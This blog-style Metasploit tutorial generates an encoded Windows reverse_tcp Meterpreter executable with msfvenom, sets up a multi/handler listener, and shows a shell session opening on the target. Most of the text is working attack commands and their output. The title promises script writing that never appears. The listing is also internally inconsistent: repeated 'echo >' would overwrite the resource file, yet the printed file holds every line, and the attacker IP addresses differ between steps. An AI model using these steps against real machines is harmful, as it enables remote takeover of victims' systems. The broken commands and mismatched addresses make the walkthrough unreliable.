---
draft: false
title:  MSF Writing Meterpreter Script
linkTitle: Writing Meterpreter Script
translationKey: msf-meterpreter-script-writing
weight: 370
date: 2017-06-14T13:47:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: You can find the information about writing a script in Metasploit Framework in this article.
url:  /msf-meterpreter-script-writing/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
## Writing Scripts

First, let's see some rules to consider when writing a new script.

* Not all Windows versions are the same.

* Some Windows versions include security measures.

* Windows Scripts behave differently depending on the version.

* You may need to be specific to the Windows version when writing a script.

Considering the rules mentioned above, it is necessary to write a target-specific script. In this case, the script we will write can work correctly.

Now, let's create an executable .exe file with the following command. This program will run on the target system and open a reverse connection to our local computer.

```bash
root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: Meterpreter.exe
```

Our required .exe file has been created. This file will run in the target windows operating system and will communicate with the local computer. Then we need to create a listener on the local computer. Let's create our listener.

```bash
root@kali:~# touch meterpreter.rc
root@kali:~# echo use exploit/multi/handler > meterpreter.rc
root@kali:~# echo set PAYLOAD windows/meterpreter/reverse_tcp > meterpreter.rc
root@kali:~# echo set LHOST 192.168.1.184 > meterpreter.rc
root@kali:~# echo set ExitOnSession false > meterpreter.rc
root@kali:~# echo exploit -j -z > meterpreter.rc
root@kali:~# cat meterpreter.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.184
set ExitOnSession false
exploit -j -z
```

If you notice, we set the multi handler module as a listener with the commands. We used the reverse_tcp module as the payload module. We set the local IP address as 192.168.1.184.

If we save the newly written scripts to the `/usr/share/metasploit-framework/scripts/meterpreter` folder, we can use them easily.

Now, what we need to do is start the `msfconsole` program by referencing the `meterpreter.rc` file we just created.

```bash
root@kali:~# msfconsole -r meterpreter.rc

 [ metasploit v4.8.2-2014021901 [core:4.8 api:1.0] ]
+ -- --[ 1265 exploits - 695 auxiliary - 202 posts ]
+ -- --[ 330 payloads - 32 encoders - 8 nops ]

resource> use exploit/multi/handler
resource> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource> set LHOST 192.168.1.184
LHOST => 192.168.1.184
resource> set ExitOnSession false
ExitOnSession => false
resource> exploit -j -z
> Handler binding to LHOST 0.0.0.0
> Started reverse handler
> Starting the payload handler...
```

As you can see above, Metasploit Framework started by listening. Now, when we run the .exe file we created in Windows, the session will be activated.

```bash
> Sending stage (718336 bytes)
> Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)

msf exploit(handler) > sessions -i 1
> Starting interaction with 1...

meterpreter >
```
